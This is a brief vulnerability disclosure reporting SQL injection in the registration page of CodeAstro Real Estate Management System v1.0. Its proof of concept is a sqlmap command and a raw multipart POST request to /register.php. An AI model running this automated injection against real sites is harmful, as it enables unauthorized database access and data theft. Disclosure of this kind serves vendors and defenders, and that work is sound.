# SQLi vulnerability in CodeAstro Real Estate Management System v1.0 of file /register.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /register.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```http
POST /register.php HTTP/1.1
Host: www.realestate.com
Origin: http://www.realestate.com
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
Referer: http://www.realestate.com/register.php
Cookie: PHPSESSID=d4bb5bt4089bi920s8gj8fb0np
Accept-Language: zh-CN,zh;q=0.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryI9iyogBjp2vFAQww
Content-Length: 783

------WebKitFormBoundaryI9iyogBjp2vFAQww
Content-Disposition: form-data; name="name"

test
------WebKitFormBoundaryI9iyogBjp2vFAQww
Content-Disposition: form-data; name="email"

test@test.com
------WebKitFormBoundaryI9iyogBjp2vFAQww
Content-Disposition: form-data; name="phone"

1888888888
------WebKitFormBoundaryI9iyogBjp2vFAQww
Content-Disposition: form-data; name="pass"

123456
------WebKitFormBoundaryI9iyogBjp2vFAQww
Content-Disposition: form-data; name="utype"

user
------WebKitFormBoundaryI9iyogBjp2vFAQww
Content-Disposition: form-data; name="uimage"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryI9iyogBjp2vFAQww
Content-Disposition: form-data; name="reg"

Register
------WebKitFormBoundaryI9iyogBjp2vFAQww--
```



![image-20250602120319720](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202506021203818.png)